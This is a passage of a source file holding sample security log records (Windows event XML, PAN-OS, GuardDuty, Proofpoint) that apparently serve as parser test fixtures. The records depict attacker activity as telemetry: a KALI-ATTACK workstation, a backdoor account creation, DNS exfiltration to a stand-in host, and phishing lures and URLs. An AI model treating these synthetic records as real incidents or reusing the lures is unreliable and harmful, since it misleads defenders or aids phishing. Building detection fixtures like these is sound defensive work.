    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8004</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>512</EventRecordID><Correlation/><Execution ProcessID='620' ThreadID='712'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>DC-01.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='DomainName'>ACME</Data><Data Name='UserName'>jdoe</Data><Data Name='WorkstationName'>WKS-1042</Data><Data Name='SChannelName'></Data><Data Name='ProcessName'></Data><Data Name='LogonType'>3</Data><Data Name='SChannelType'>0</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8001</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>513</EventRecordID><Correlation/><Execution ProcessID='980' ThreadID='1120'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='TargetName'>cifs/fileserver.acme.local</Data><Data Name='UserName'>jdoe</Data><Data Name='DomainName'>ACME</Data><Data Name='WorkstationName'>WKS-1042</Data><Data Name='PID'>4</Data><Data Name='ProcessName'>System</Data><Data Name='LogonType'>3</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8002</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>514</EventRecordID><Correlation/><Execution ProcessID='620' ThreadID='712'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>DC-01.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UserName'>svc_backup</Data><Data Name='DomainName'>ACME</Data><Data Name='WorkstationName'>SRV-BAK-03</Data><Data Name='SecureChannelName'>ACME</Data><Data Name='CalleeProcessName'>C:\\Windows\\System32\\lsass.exe</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8004</EventID><Version>0</Version><Level>2</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>515</EventRecordID><Correlation/><Execution ProcessID='620' ThreadID='980'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>DC-01.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='DomainName'>ACME</Data><Data Name='UserName'>administrator</Data><Data Name='WorkstationName'>KALI-ATTACK</Data><Data Name='SChannelName'></Data><Data Name='ProcessName'></Data><Data Name='LogonType'>3</Data><Data Name='SChannelType'>0</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-NTLM' Guid='{ac550f9a-b9d0-4b1e-a3f9-eb43a4d6f1c5}'/><EventID>8001</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>516</EventRecordID><Correlation/><Execution ProcessID='2412' ThreadID='3120'/><Channel>Microsoft-Windows-NTLM/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-21-1004336348-1177238915-682003330-1013'/></System><EventData><Data Name='TargetName'>http/intranet.acme.local</Data><Data Name='UserName'>jdoe</Data><Data Name='DomainName'>ACME</Data><Data Name='WorkstationName'>WKS-1042</Data><Data Name='PID'>4820</Data><Data Name='ProcessName'>C:\\Program Files\\Internet Explorer\\iexplore.exe</Data><Data Name='LogonType'>3</Data></EventData></Event>`,
  ],
  windows_xml_defender: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>1116</EventID><Version>0</Version><Level>3</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>3201</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='4120'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Severity Name'>Severe</Data><Data Name='Category Name'>Trojan</Data><Data Name='Threat Name'>Trojan:Win32/Wacatac.B!ml</Data><Data Name='Path'>file:_C:\\Users\\jdoe\\Downloads\\invoice.exe</Data><Data Name='Detection User'>ACME\\jdoe</Data><Data Name='Action Name'>Quarantine</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>1117</EventID><Version>0</Version><Level>3</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:01.550000000Z'/><EventRecordID>3202</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='4120'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Threat Name'>Trojan:Win32/Wacatac.B!ml</Data><Data Name='Action Name'>Quarantine</Data><Data Name='Action ID'>2</Data><Data Name='Status Code'>0</Data><Data Name='Path'>file:_C:\\Users\\jdoe\\Downloads\\invoice.exe</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>5001</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>3203</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='2044'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Feature Name'>Real-Time Protection</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>1000</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>3204</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='4120'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Scan ID'>{a1b2c3d4-e5f6-7890-abcd-ef1234567890}</Data><Data Name='Scan Type Index'>1</Data><Data Name='Scan Type Name'>Quick Scan</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Windows Defender' Guid='{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}'/><EventID>2000</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>3205</EventRecordID><Correlation/><Execution ProcessID='3208' ThreadID='4120'/><Channel>Microsoft-Windows-Windows Defender/Operational</Channel><Computer>WKS-1042.acme.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='Product Name'>Microsoft Defender Antivirus</Data><Data Name='Current Signature Version'>1.409.512.0</Data><Data Name='Previous Signature Version'>1.409.498.0</Data><Data Name='Update Type'>4</Data><Data Name='Signature Type'>AntiVirus</Data></EventData></Event>`,
  ],
  windows_sysmon: [
    '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Sysmon\' Guid=\'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\'2020-11-03T15:50:18.661792800Z\'/><EventRecordID>8</EventRecordID><Correlation/><Execution ProcessID=\'5112\' ThreadID=\'748\'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-807.attackrange.local</Computer><Security UserID=\'S-1-5-18\'/></System><EventData><Data Name=\'RuleName\'>-</Data><Data Name=\'UtcTime\'>2020-11-03 15:50:18.572</Data><Data Name=\'ProcessGuid\'>{D28789B6-7C3A-5FA1-EF02-000000008701}</Data><Data Name=\'ProcessId\'>4940</Data><Data Name=\'Image\'>C:\\Windows\\System32\\wbem\\unsecapp.exe</Data><Data Name=\'FileVersion\'>10.0.14393.2515 (rs1_release_1.180830-1044)</Data><Data Name=\'Description\'>Sink to receive asynchronous callbacks for WMI client application</Data><Data Name=\'Product\'>Microsoft\\u00ae Windows\\u00ae Operating System</Data><Data Name=\'Company\'>Microsoft Corporation</Data><Data Name=\'OriginalFileName\'>unsecapp.dll</Data><Data Name=\'CommandLine\'>C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding</Data><Data Name=\'CurrentDirectory\'>C:\\Windows\\system32\\</Data><Data Name=\'User\'>NT AUTHORITY\\SYSTEM</Data><Data Name=\'LogonGuid\'>{D28789B6-7ACF-5FA1-E703-000000000000}</Data><Data Name=\'LogonId\'>0x3e7</Data><Data Name=\'TerminalSessionId\'>0</Data><Data Name=\'IntegrityLevel\'>System</Data><Data Name=\'Hashes\'>MD5=2E49BB6C9F6599F518FE30BE2F000247,SHA256=20F499D581CF4AF331D8EC8B1E07A32CC1A695EF6790B51DA5EE223C5867154F,IMPHASH=A3CC49DF67C2278F822C9EBB9908BF09</Data><Data Name=\'ParentProcessGuid\'>{D28789B6-7AD1-5FA1-0C00-000000008701}</Data><Data Name=\'ParentProcessId\'>572</Data><Data Name=\'ParentImage\'>C:\\Windows\\System32\\svchost.exe</Data><Data Name=\'ParentCommandLine\'>C:\\Windows\\system32\\svchost.exe -k DcomLaunch</Data></EventData></Event>',
    '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Sysmon\' Guid=\'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\'2020-11-03T15:51:30.816263300Z\'/><EventRecordID>2414</EventRecordID><Correlation/><Execution ProcessID=\'2152\' ThreadID=\'3472\'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-807.attackrange.local</Computer><Security UserID=\'S-1-5-18\'/></System><EventData><Data Name=\'RuleName\'>Usermode</Data><Data Name=\'UtcTime\'>2020-11-03 15:51:28.673</Data><Data Name=\'ProcessGuid\'>{D28789B6-7C6B-5FA1-2700-000000008801}</Data><Data Name=\'ProcessId\'>2324</Data><Data Name=\'Image\'>C:\\Users\\Public\\splunkd.exe</Data><Data Name=\'User\'>NT AUTHORITY\\SYSTEM</Data><Data Name=\'Protocol\'>tcp</Data><Data Name=\'Initiated\'>true</Data><Data Name=\'SourceIsIpv6\'>false</Data><Data Name=\'SourceIp\'>10.0.1.14</Data><Data Name=\'SourceHostname\'>win-dc-807.attackrange.local</Data><Data Name=\'SourcePort\'>49694</Data><Data Name=\'SourcePortName\'>-</Data><Data Name=\'DestinationIsIpv6\'>false</Data><Data Name=\'DestinationIp\'>10.0.1.12</Data><Data Name=\'DestinationHostname\'>-</Data><Data Name=\'DestinationPort\'>7010</Data><Data Name=\'DestinationPortName\'>-</Data></EventData></Event>',
    '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Sysmon\' Guid=\'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\'2020-11-03T15:50:19.884998500Z\'/><EventRecordID>93</EventRecordID><Correlation/><Execution ProcessID=\'5112\' ThreadID=\'748\'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-807.attackrange.local</Computer><Security UserID=\'S-1-5-18\'/></System><EventData><Data Name=\'RuleName\'>-</Data><Data Name=\'UtcTime\'>2020-11-03 15:50:19.873</Data><Data Name=\'ProcessGuid\'>{D28789B6-7C3B-5FA1-F302-000000008701}</Data><Data Name=\'ProcessId\'>4920</Data><Data Name=\'Image\'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\'TargetFilename\'>C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xzdyha4l.i4c.ps1</Data><Data Name=\'CreationUtcTime\'>2020-11-03 15:50:19.873</Data></EventData></Event>',
    '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Sysmon\' Guid=\'{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\'2020-11-03T15:50:22.605527200Z\'/><EventRecordID>287</EventRecordID><Correlation/><Execution ProcessID=\'5112\' ThreadID=\'748\'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-807.attackrange.local</Computer><Security UserID=\'S-1-5-18\'/></System><EventData><Data Name=\'RuleName\'>-</Data><Data Name=\'EventType\'>SetValue</Data><Data Name=\'UtcTime\'>2020-11-03 15:50:22.591</Data><Data Name=\'ProcessGuid\'>{D28789B6-7C3D-5FA1-FC02-000000008701}</Data><Data Name=\'ProcessId\'>4720</Data><Data Name=\'Image\'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\'TargetObject\'>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational\\MaxSize</Data><Data Name=\'Details\'>DWORD (0x12d2c000)</Data></EventData></Event>',
  ],
  windows_xml_security: [
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:24:00.123456700Z'/><EventRecordID>556677</EventRecordID><Correlation ActivityID='{b1c2d3e4-f5a6-7890-bcde-f01234567890}'/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>DC-01$</Data><Data Name='SubjectDomainName'>ACME</Data><Data Name='SubjectLogonId'>0x3e7</Data><Data Name='TargetUserSid'>S-1-5-21-1004336348-1177238915-682003330-1013</Data><Data Name='TargetUserName'>jdoe</Data><Data Name='TargetDomainName'>ACME</Data><Data Name='TargetLogonId'>0x1a2b3c</Data><Data Name='LogonType'>3</Data><Data Name='LogonProcessName'>NtLmSsp</Data><Data Name='AuthenticationPackageName'>NTLM</Data><Data Name='WorkstationName'>WKS-1042</Data><Data Name='LogonGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ProcessId'>0x0</Data><Data Name='ProcessName'>-</Data><Data Name='IpAddress'>10.0.1.50</Data><Data Name='IpPort'>51920</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:25:12.884000000Z'/><EventRecordID>556678</EventRecordID><Correlation/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-0-0</Data><Data Name='SubjectUserName'>-</Data><Data Name='SubjectDomainName'>-</Data><Data Name='SubjectLogonId'>0x0</Data><Data Name='TargetUserSid'>S-1-0-0</Data><Data Name='TargetUserName'>administrator</Data><Data Name='TargetDomainName'>ACME</Data><Data Name='Status'>0xc000006d</Data><Data Name='FailureReason'>%%2313</Data><Data Name='SubStatus'>0xc0000064</Data><Data Name='LogonType'>3</Data><Data Name='LogonProcessName'>NtLmSsp</Data><Data Name='AuthenticationPackageName'>NTLM</Data><Data Name='WorkstationName'>KALI-ATTACK</Data><Data Name='ProcessId'>0x0</Data><Data Name='ProcessName'>-</Data><Data Name='IpAddress'>203.0.113.66</Data><Data Name='IpPort'>49771</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>12545</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:26:40.005000000Z'/><EventRecordID>556679</EventRecordID><Correlation/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='TargetUserSid'>S-1-5-21-1004336348-1177238915-682003330-1013</Data><Data Name='TargetUserName'>jdoe</Data><Data Name='TargetDomainName'>ACME</Data><Data Name='TargetLogonId'>0x1a2b3c</Data><Data Name='LogonType'>3</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12548</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:27:02.220000000Z'/><EventRecordID>556680</EventRecordID><Correlation/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-1004336348-1177238915-682003330-500</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ACME</Data><Data Name='SubjectLogonId'>0x3e7abc</Data><Data Name='PrivilegeList'>SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege</Data></EventData></Event>`,
    `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2024-05-06T17:28:15.771000000Z'/><EventRecordID>556681</EventRecordID><Correlation/><Execution ProcessID='656' ThreadID='740'/><Channel>Security</Channel><Computer>DC-01.acme.local</Computer><Security/></System><EventData><Data Name='TargetUserName'>svc_backdoor</Data><Data Name='TargetDomainName'>ACME</Data><Data Name='TargetSid'>S-1-5-21-1004336348-1177238915-682003330-2001</Data><Data Name='SubjectUserSid'>S-1-5-21-1004336348-1177238915-682003330-500</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ACME</Data><Data Name='SubjectLogonId'>0x3e7abc</Data><Data Name='SamAccountName'>svc_backdoor</Data><Data Name='DisplayName'>%%1793</Data></EventData></Event>`,
  ],
  // PAN-OS SYSTEM logs — comma-separated PAN-OS format behind a BSD syslog header.
  // The syslog prefix glues into the discarded first column (future_use1), so the
  // named CSV columns still align (receive_time is index 1). SYSTEM is the
  // device/operational trail (auth daemon, config commit, HA, routing) — data
  // class 'audit', NOT the network 5-tuple of traffic/threat.
  palo_alto_system: [
    'Sep 15 08:14:22 PA-3220 1,2026/09/15 08:14:22,007051000012345,SYSTEM,auth,0,2026/09/15 08:14:22,vsys1,auth-success,,0,0,auth,informational,"User admin authenticated successfully. From: 10.20.1.50. Auth mode: normal.",4455661,0x0,0,0,0,0,vsys1,PA-3220',
    'Sep 15 08:15:03 PA-3220 1,2026/09/15 08:15:03,007051000012345,SYSTEM,auth,0,2026/09/15 08:15:03,vsys1,auth-fail,,0,0,auth,medium,"failed authentication for user \'operator\'. Reason: Invalid username/password. From: 203.0.113.44.",4455662,0x0,0,0,0,0,vsys1,PA-3220',
    'Sep 15 08:20:41 PA-3220 1,2026/09/15 08:20:41,007051000012345,SYSTEM,general,0,2026/09/15 08:20:41,,general,,0,0,general,informational,"Config committed by admin. Commit description: update security rules.",4455663,0x0,0,0,0,0,,PA-3220',
    'Sep 15 08:31:10 PA-3220 1,2026/09/15 08:31:10,007051000012345,SYSTEM,ha,0,2026/09/15 08:31:10,,ha-state,,0,0,ha,high,"HA Group 1: Local device changed state from active to passive. Reason: preemption.",4455664,0x0,0,0,0,0,,PA-3220',
    'Sep 15 08:45:57 PA-3220 1,2026/09/15 08:45:57,007051000012345,SYSTEM,routing,0,2026/09/15 08:45:57,vsys1,routed-bgp,,0,0,routing,informational,"BGP peer 198.51.100.2 state changed to Established.",4455665,0x0,0,0,0,0,vsys1,PA-3220',
    'Sep 15 09:02:13 PA-3220 1,2026/09/15 09:02:13,007051000012345,SYSTEM,general,0,2026/09/15 09:02:13,,dnl-update,,0,0,general,informational,"Content version 8811-8102 downloaded and installed successfully.",4455666,0x0,0,0,0,0,,PA-3220',
  ],
  aws_guardduty: [
    '{"schemaVersion":"2.0","accountId":"123456789012","region":"us-east-1","partition":"aws","id":"abc123def456","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/aabbccdd/finding/abc123","type":"UnauthorizedAccess:EC2/MaliciousIPCaller.Custom","resource":{"resourceType":"Instance","instanceDetails":{"instanceId":"i-0abc123def456","instanceType":"t3.medium","launchTime":"2024-03-10T12:00:00Z","platform":null,"networkInterfaces":[{"privateIpAddress":"10.0.1.50","publicIp":"54.210.100.50","subnetId":"subnet-abc123"}]}},"severity":8.0,"createdAt":"2024-03-15T10:30:00Z","updatedAt":"2024-03-15T10:30:00Z","title":"EC2 instance communicating with known malicious IP","description":"EC2 instance i-0abc123def456 is communicating with a known malicious IP address 198.51.100.23."}',
    '{"schemaVersion":"2.0","accountId":"123456789012","region":"us-east-1","partition":"aws","id":"def789ghi012","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/aabbccdd/finding/def789","type":"Recon:EC2/PortProbeUnprotectedPort","resource":{"resourceType":"Instance","instanceDetails":{"instanceId":"i-0def789ghi012","instanceType":"t3.small","launchTime":"2024-03-12T08:00:00Z","networkInterfaces":[{"privateIpAddress":"10.0.2.100","publicIp":"3.95.200.100","subnetId":"subnet-def456"}]}},"severity":5.0,"createdAt":"2024-03-15T11:00:00Z","updatedAt":"2024-03-15T11:15:00Z","title":"Unprotected port on EC2 instance is being probed","description":"EC2 instance i-0def789ghi012 has an unprotected port 22 being probed by 203.0.113.50."}',
    '{"schemaVersion":"2.0","accountId":"123456789012","region":"eu-west-1","partition":"aws","id":"jkl345mno678","arn":"arn:aws:guardduty:eu-west-1:123456789012:detector/eeffgghh/finding/jkl345","type":"CryptoCurrency:EC2/BitcoinTool.B!DNS","resource":{"resourceType":"Instance","instanceDetails":{"instanceId":"i-0jkl345mno678","instanceType":"c5.xlarge","launchTime":"2024-03-14T16:00:00Z","networkInterfaces":[{"privateIpAddress":"10.1.0.25","subnetId":"subnet-ghi789"}]}},"severity":8.0,"createdAt":"2024-03-15T09:45:00Z","updatedAt":"2024-03-15T09:50:00Z","title":"EC2 instance querying Bitcoin-related domain","description":"EC2 instance i-0jkl345mno678 is querying a domain associated with Bitcoin mining pool."}',
    '{"schemaVersion":"2.0","accountId":"123456789012","region":"us-east-1","partition":"aws","id":"pqr901stu234","arn":"arn:aws:guardduty:us-east-1:123456789012:detector/aabbccdd/finding/pqr901","type":"UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B","resource":{"resourceType":"AccessKey","accessKeyDetails":{"accessKeyId":"AKIA1234567890ABCDEF","principalId":"AIDA1234567890ABCDEF","userType":"IAMUser","userName":"compromised-user"}},"severity":6.0,"createdAt":"2024-03-15T07:20:00Z","updatedAt":"2024-03-15T07:25:00Z","title":"Successful console sign-in from unusual location","description":"A console sign-in was observed for principal compromised-user from an unusual IP 185.220.101.50."}',
    '{"schemaVersion":"2.0","accountId":"123456789012","region":"us-west-2","partition":"aws","id":"vwx567yza890","arn":"arn:aws:guardduty:us-west-2:123456789012:detector/iijjkkll/finding/vwx567","type":"Trojan:EC2/DNSDataExfiltration","resource":{"resourceType":"Instance","instanceDetails":{"instanceId":"i-0vwx567yza890","instanceType":"m5.large","launchTime":"2024-03-13T20:00:00Z","networkInterfaces":[{"privateIpAddress":"172.16.0.50","publicIp":"52.40.100.50","subnetId":"subnet-jkl012"}]}},"severity":9.0,"createdAt":"2024-03-15T06:10:00Z","updatedAt":"2024-03-15T06:15:00Z","title":"DNS exfiltration detected from EC2 instance","description":"EC2 instance i-0vwx567yza890 is performing DNS queries consistent with data exfiltration to evil.example.com."}',
  ],
  proofpoint_tap: [
    '{"GUID":"abc123-def456","type":"messagesDelivered","threatsInfoMap":[{"threatType":"url","classification":"malicious","threat":"http://evil.example.com/payload","threatTime":"2024-03-15T10:00:00Z"}],"messageTime":"2024-03-15T09:58:00Z","sender":"attacker@malicious.com","recipient":["victim@company.com"],"subject":"Urgent: Update your credentials","headerFrom":"IT Department <it@company-look-alike.com>","senderIP":"198.51.100.10","messageSize":45000,"malwareScore":100,"phishScore":90,"spamScore":10,"QID":"abc123456","messageParts":[{"disposition":"inline","sha256":"aabbccdd11223344","filename":"invoice.pdf","contentType":"application/pdf"}]}',
    '{"GUID":"ghi789-jkl012","type":"messagesBlocked","threatsInfoMap":[{"threatType":"attachment","classification":"malicious","threat":"trojan.gen.2","threatTime":"2024-03-15T11:30:00Z"}],"messageTime":"2024-03-15T11:29:00Z","sender":"spam@botnet.org","recipient":["finance@company.com","cfo@company.com"],"subject":"Payment Confirmation #8847291","headerFrom":"Payment System <noreply@payments-fake.com>","senderIP":"203.0.113.99","messageSize":128000,"malwareScore":100,"phishScore":45,"spamScore":95,"QID":"def789012","messageParts":[{"disposition":"attached","sha256":"eeff0011223344","filename":"payment_details.exe","contentType":"application/x-msdownload"}]}',
    '{"GUID":"mno345-pqr678","type":"clicksPermitted","clickTime":"2024-03-15T14:22:00Z","url":"https://legitimate-looking.example.com/login","threatTime":"2024-03-15T14:22:05Z","classification":"phish","clickIP":"10.0.1.50","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","sender":"hr-fake@company-look.com","recipient":"employee@company.com","messageID":"<msg123@mail.company.com>"}',
    '{"GUID":"stu901-vwx234","type":"messagesDelivered","threatsInfoMap":[],"messageTime":"2024-03-15T08:15:00Z","sender":"partner@trusted-vendor.com","recipient":["procurement@company.com"],"subject":"Q1 Invoice Attached","headerFrom":"Vendor Corp <billing@trusted-vendor.com>","senderIP":"198.51.100.200","messageSize":22000,"malwareScore":0,"phishScore":5,"spamScore":2,"QID":"ghi345678","messageParts":[{"disposition":"attached","sha256":"aabb1122ccdd3344","filename":"Q1_Invoice.pdf","contentType":"application/pdf"}]}',
    '{"GUID":"yza567-bcd890","type":"clicksBlocked","clickTime":"2024-03-15T16:45:00Z","url":"http://credential-harvest.example.net/office365","threatTime":"2024-03-15T16:45:01Z","classification":"malicious","clickIP":"10.0.2.75","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)","sender":"admin-fake@365-support.example.com","recipient":"exec@company.com","messageID":"<msg456@mail.company.com>"}',
  ],
  kubernetes_audit: [
